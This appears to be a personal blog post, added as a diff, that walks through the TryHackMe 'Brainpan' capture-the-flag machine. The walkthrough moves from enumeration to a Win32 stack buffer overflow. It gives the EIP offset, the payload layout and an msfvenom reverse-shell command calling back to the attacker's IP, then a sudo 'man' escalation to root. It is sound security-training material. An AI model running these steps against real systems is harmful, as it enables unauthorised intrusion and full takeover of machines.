@@ -1,0 +1,473 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+    
+    <head>
+        <title>Win32 Remote Buffer Overflow Challenge - Brainpan</title>
+	    <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
+	    <link type="text/css" rel="stylesheet" href="../../../../css/RobotoCondensed.css" />
+	  	<link type="text/css" rel="stylesheet" href="../../../../css/style.css" media="screen"/>
+	  	<script type="text/javascript" src="../../../../js/jquery-1.js"></script>
+        <meta name="thumbnail" content="images/0cc2d2e4fb0041af30687ab5ddcbf9c7.png" />
+    </head>
+    
+    <body>
+	    <div id="mainwrap">
+	        <br/>
+	        <header>
+		        
+		        <!--
+		             Feel free to send feedback or suggestions
+		             through PGP contact form or email.
+		        -->
+
+	        </header>
+	        
+	        <div id="mainwrap">
+		        <div id="content-post">
+
+		            <div id="posts" class="section-post">	    
+			            <h2>Win32 Remote Buffer Overflow Challenge - Brainpan</h2>
+			            <hr/>
+                        <p style="text-align: right">
+                            <i>10-07-2020</i>
+                        </p>
+                        
+			            <p><h3>Introduction</h3></p>
+                        <p>
+                            <center><img src="images/0cc2d2e4fb0041af30687ab5ddcbf9c7.png" /></center>
+                        </p>
+			            <p>
+                            This <i>easy</i> challenge (or <i>hacktivity</i>)
+                            requires analyzing a
+                            PE32 executable file by reversing it and find a buffer
+                            overflow
+                            vulnerability in order to achieve RCE.
+                        </p>
+                        <p>
+                            We are given an IP address instead of a binary
+                            executable file.
+			            </p>
+
+
+                        <p><h3>Enumeration</h3></p>
+                        <p>
+                            Starting with a quick Nmap scan we discover two open
+                            ports. In particular,
+                            port <code-line>10000</code-line> is hosting a web server.
+			            </p>
+                        <p>
+                            <center><img src="images/93733cef8bb208420adc717ae24c26c2.png" width="600" /></center>
+                        </p>
+                        <p>
+                            By accessing <code-line>http://10.10.145.154:10000/</code-line>
+                            through web browser we
+                            are presented with a fancy image suggesting to practice
+                            <i>safe programming</i>.
+                        </p>
+                        <p>
+                            <center><img src="images/d24668aaf1f5fd01daebd9d9b103f80c.png" width="600" /></center>
+                        </p>
+                        <p>
+                            While running sub-directory scanner it found the
+                            directory <code-line>/bin/</code-line>
+                            with <i>Directory Listing</i> enabled and containing
+                            the required file.
+                        </p>
+                        <p>
+                            <center><img src="images/e27c85bffdce32c29c2670863cd7b3ec.png" /></center>
+                        </p>
+                        <p>
+                            Also, connecting via Netcat to the other port
+                            <code-line>9999</code-line> displays
+                            the following terminal which is probably served by
+                            the file we just found
+                            on <code-line>/bin/</code-line> directory of web server.
+                        </p>
+                        <p>
+                            <center><img src="images/17f1323254b178a921b625c49a568b84.png" /></center>
+                        </p>
+                        <p>
+                            Now the current plan to hack the machine is:
+                            <ol>
+                                <li>Reverse engineer the binary file</li>
+                                <li>Find a buffer overflow vulnerability</li>
+                                <li>Exploit the vulnerability</li>
+                                <li>Gain initial foothold on remote machine</li>
+                                <li>Try to escalate privilages</li> 
+                            </ol>
+                        </p>
+
+
+                        <p><h3>Reversing</h3></p>
+                        <p>
+                            In summary, this simple application starts by
+                            initializing a socket <i>Winsock</i>
+                            to be able to establish TCP/IP connections via <code-line>9999</code-line> port and then
+                            receives the user input.
+                        </p>
+                        <p>
+                            This input is stored in a buffer with an approximate
+                            capacity of <code-line>0x208 bytes</code-line>
+                            (that is roughly <code-line>520 bytes</code-line>) and then
+                            compares with string
+                            <code-line>shitstorm</code-line>, which is the correct password
+                            to be "granted access".
+                        </p>
+                        <p>
+                            <center><img src="images/3716b020cd656dc18b47f2b57fdcba12.png" /></center>
+                        </p>
+                        <p>
+                            Note that the function being used
+                            <code-line>strcpy()</code-line> does not specify the
+                            size of destination array thus it does not prevent
+                            overwriting
+                            other data outside the current buffer limit
+                            (<i>buffer overflow</i>).
+                        </p>
+                        <p>
+                            To fix this issue, the current string copy function
+                            should be replaced with
+                            <code-line>str<b>n</b>cpy()</code-line> to specify the limit
+                            of characters to be read
+                            into the buffer.
+                            This function has a better security approach since
+                            it does ensure only
+                            first <i>n</i> bytes are copied, preventing overflow.
+                        </p>
+
+
+                        <p><h3>Exploit</h3></p>
+                        <p>
+                            As usual, we start by sending a lot of bytes to
+                            crash the program and confirm
+                            the overflow. Sending a total of <code-line>1024 A</code-line>'s
+                            will terminate the process
+                            and display the following exception. Note this was
+                            performed in a Windows virtual
+                            environment as we don't have control over the target
+                            machine, <i>yet</i>.
+                        </p>
+                        <p>
+                            <center><img src="images/c0705e94e5195355054ffb3d99ed08ef.png" /></center>
+                        </p>
+                        <p>
+                            At this point, we can run <i>Immunity Debugger</i> to
+                            analyze program behavior during
+                            runtime by attaching to a running proces. It will be
+                            essential to be able to understand
+                            and write a basic exploit.
+                        </p>
+                        <p>
+                            Instead of sending a sequence of <code-line>A</code-line>'s we
+                            can generate a string pattern
+                            that contains unique substring sequences. This is
+                            particularly useful to locate specific
+                            elements and see how the input adjusts in stack.
+                        </p>
+                        <p>                        
+                            The scripts <code-line>pattern_create.rb</code-line> and
+                            <code-line>pattern_offset.rb</code-line> are available
+                            within <i>Metasploit Framework</i> tools.
+                        </p>
+                        <p>
+                            <center><img src="images/2c08837f1e9e882849674dd85c415e46.png" width="600" /></center>
+                        </p>
+                        <p>
+                            If we provide this input to the running program
+                            while attached to Immunity Debugger
+                            it is possible to observe the actual state of
+                            registers and stack.
+                        </p>
+                        <p>
+                            <center><img src="images/a023f3540c3cb435a3ab6a9a25d78f15.png" width="500" /></center>
+                        </p>
+                        <p>
+                            The instruction pointer value was overwritten
+                            with <code-line>4Ar5</code-line>. By replacing the substring
+                            <code-line>4Ar5</code-line> with a valid instruction address,
+                            we are able to control <i>EIP</i> and decide which
+                            instruction will be executed next when the current
+                            procedure returns because we are overwriting the
+                            <i>return address</i>.
+                        </p>
+                        <p>
+                            In a normal execution,
+                            the <i>EIP</i> should go back to the
+                            <i>return address</i> that was previously stored at
+                            the bottom
+                            of the current stack frame in order to let the
+                            program continue its normal execution.
+                        </p>
+                        <p>
+                            We can also observe that stack pointer is pointing to
+                            overwritten content of the previous stack frame,
+                            beginning at <code-line>Ar6A (eip+4)</code-line>.
+                            Its important to note that we can use this space
+                            to store shellcode and then set the
+                            <i>EIP</i> to that location.
+                        </p>
+
+                        <p>
+                            Now the offset of both <i>EIP</i> and <i>ESP</i> may
+                            be calculated using <code-line>pattern_offset.rb</code-line>
+                            and providing both words.
+                        </p>
+                        
+                        <p>
+                            <center><img src="images/15ffc8b465ae6761e0bd6437a9610cd1.png" width="650" /></center>
+                        </p>
+
+                        <p>
+                            With the correct offset we can tweak our string to
+                            hold different values at different places.
+                            It should hold <code-line>524 A</code-line>'s to fill the
+                            buffer plus the next <code-line>4 bytes</code-line>
+                            will overwrite return address and the other
+                            next <code-line>4 bytes</code-line> will be what stack
+                            pointer will be pointing to.
+                        </p>
+                        <p>
+                            <center>
+                                <code-line> payload = 'A' * 524 + 'B' * 4 </code-line>
+                            </center>
+                        </p>              
+                        <p>
+                            It will cause the process to terminate due to
+                            <code-line>0x42424242</code-line>
+                            not being an address pointing to a valid instruction. 
+                        </p>
+                        
+                        <p>
+                            <center><img src="images/2d295a68e195ff56a5e7a84062e3a931.png" width="600" /></center>
+                        </p>
+
+                        <p>
+                            At this point we are already able to build a solid
+                            payload. The structure
+                            should be similar to the following scheme:
+                        </p>
+                        <p>
+                            <center><img src="images/86493970e4224539e334675f32f88936.png" width="450" />
+                                <br/><i>Credits: m0chan.github.io</i>
+                            </center>
+                        </p>
+                        <p>
+                            Payload should contain <code-line>524 A</code-line>'s
+                            followed by <code-line>4</code-line> bytes of a
+                            <code-line>jmp esp</code-line> instruction address, then
+                            a <i>NOP sled</i> and the shellcode.
+                        </p>
+                        <p>
+                            The <i>NOP sled</i> will basically serve as a
+                            frame for where the <i>ESP</i>
+                            could be pointing to,
+                            to ensure that after the <code-line>jmp esp</code-line>
+                            instruction is executed, it will
+                            fall anywhere within the <i>sled</i>,
+                            and <i>slide</i> directly into the shellcode.
+                        </p>
+
+                        <p>
+                            We can use <i>objdump</i> to find a
+                            <code-line>jmp esp</code-line> instruction address
+                            and use it to overwrite
+                            the ret. address.
+                        </p>
+                        <p>
+                            <center><img src="images/4cb6781be4e4cefdda9effb1b24cd788.png" width="600" /></center>
+                        </p>
+
+                        <p>
+                            In this case, the payload should look like this:
+                        </p>
+                        <p>
+                            <center>
+                                <code-line> payload = 'A' * 524 +
+                  '\xf3\x12\x17\x31' +
+                  '\x90' * 16 + '&lt;shellcode&gt;' </code-line>
+                            </center>
+                        </p>
+
+                        <p>
+                            In other words:
+                        </p>
+                        <p>
+                            <center>
+                                <code-line> payload = &lt;fill buf. w/ 524 bytes&gt;
+                  + &lt;addr. of
+                  jmp esp instr.&gt; + &lt;nop sled of 4 words&gt; + &lt;shellcode&gt;</code-line>
+                            </center>
+                        </p>
+
+                        <p>
+                            We should generate shellcode using
+                            <code-line>msfvenom</code-line> by executing the command:
+                        </p>
+                        
+                        <p>
+                            <code-line>$ msfvenom -p windows/shell/reverse_tcp RHOST=10.9.53.85 RPORT=1337 -a x86 -f python -b'\x00\x0a\x0d'</code-line>.
+                        </p>
+                        <p>
+                            The generated shellcode will connect-back to
+                            <code-line>10.9.53.85:1337</code-line> therefore we must
+                            setup a listener
+                            with <code-line>msfconsole</code-line>.
+
+                            Also it will be compatible with x86
+                            architecture and outputted in Python syntax.
+                        </p>
+                        <p>
+                            The shellcode must not contain
+                            <i>bad chars</i>: <code-line>\x00, \x0a and \x0d</code-line>.
+
+                            These bytes usually interfer when dealing with
+                            string manipulation functions (e.g. the
+                            <code-line>\x00</code-line> denotes null-terminator for
+                            strings; if we include it then
+                            the program will consider it reached the end of
+                            string therefore
+                            leading to incomplete and damaged payload).
+                        </p>
+
+                        <p>
+                            The final exploit looks like this.
+                        </p>
+
+                        <p>
+                            <center><img src="images/9e2458072f38fb0c782d45eac8fe78fa.png" width="450" /></center>
+                        </p>
+                        
+                        <p>
+                            Setting up the listener on
+                            port <code-line>1337</code-line> to receive
+                            the incoming shell from target machine.
+                            <i>Bonus: HONK! :b</i>
+                        </p>
+
+                        
+                        <p>
+                            <center><img src="images/61ef59bff10989f146a3da45c3f81846.png" width="550" /></center>
+                        </p>
+
+                        
+                        <p>
+                            Finally! Executing the exploit pops a basic
+                            <i>cmd</i> shell.
+                        </p>
+
+                        
+                        <p>
+                            <center><img src="images/bbf635b0d957687e109b64566e5ac6b5.png" width="700" /></center>
+                        </p>
+
+
+
+                        <p><h3>Post-Exploitation</h3></p>
+
+                        <p>
+                            It is a surprise that the executable is being run
+                            through Wine enviornment, on a Linux machine.
+                            This shell is limited within Wine so we must escape and
+                            get a decent Bash. The most simple way is to navigate into
+                            <code-line>/bin/</code-line> and then execute <code-line>.\sh</code-line>.
+                        </p>
+
+                        <p>
+                            Also, its usually a good idea to get one more different reverse
+                            shell.
+                            In case of failure, we have a backup and could easily start over
+                            without having to run the exploit again. The exploit could kill
+                            the service
+                            and we may lose further access to the machine.
+                        </p>
+                        <p>
+                            This Python one-liner will send another shell back to our
+                            listening <i>Netcat</i>,
+                            at this time on port <code-line>1338</code-line>.
+                        </p>
+                        
+                        <p>
+                            <center><img src="images/ea1859a9d8001724cfe1610c2f0bbe09.png" width="750" /></center>
+                        </p>
+
+                        <p>
+                            From now on it is quite trivial. First the dumb shell should
+                            be upgraded to
+                            an interactive one using
+                            <code-line>python -c 'import pty; pty.spawn("/bin/sh");'</code-line>.
+                            
+                            Then, having a look at current user <code-line>puck</code-line>
+                            sudo privileges
+                            there is one command that immediately stands out:
+                            <code-line>/home/anansi/bin/anansi_util</code-line>.
+                        </p>
+                        <p>
+                            One of the available arguments is <code-line>manual [command]</code-line>.
+                            It is obvious how to get root privileges by exploiting
+                            <code-line>man</code-line>, according to
+                            <i>GTFOBins</i>.
+                        </p>
+                        
+                        <p>
+                            <center><img src="images/6ffce745846ab9e33af83e466bf25827.png" width="650" /></center>
+                        </p>
+
+                        <p>
+                            Running <code-line>sudo /home/anansi/bin/anansi_util manual man</code-line>
+                            followed by <code-line>!/bin/sh</code-line> spawns a <i>root shell</i>,
+                            thus bypassing
+                            local security restrictions! :)
+                        </p>
+
+                        <p>
+                            <center><img src="images/370d309e756023eabc8317989138ff8d.png" width="650" /></center>
+                        </p>
+                        
+
+                        <p><h3>References</h3></p>
+
+                        <p>
+                            <ol>
+                                <li><a href="https://tryhackme.com/room/brainpan">
+                                    https://tryhackme.com/room/brainpan</a></li>
+                                
+                                <li><a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html">
+                                    https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html</a></li>
+                                <li><a href="https://netsec.ws/?p=337">
+                                    https://netsec.ws/?p=337</a></li>
+                                <li><a href="https://gtfobins.github.io/gtfobins/man/#shell">
+                                    https://gtfobins.github.io/gtfobins/man/#shell</a></li>
+                            </ol>
+                        </p>
+
+                        
+                        
+			            <p style="margin-top: 5%;"><center><a href="/">← Go Back</a></center></p>
+			            
+		            </div>
+		            
+		        </div>
+		        
+	        </div>
+
+	        <div id="footer">
+		        · Original design by <a href="https://andreasviklund.com/" target="_blank">Andreas Viklund</a> ·
+	        </div>
+	        
+	        
+	    </div>
+
+	    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-156800674-1"></script>
+	    <script>
+	     window.dataLayer = window.dataLayer || [];
+	     function gtag(){dataLayer.push(arguments);}
+	     gtag('js', new Date());
+
+	     gtag('config', 'UA-156800674-1');
+	    </script>
+
+    </body>
+
+</html>
+
+
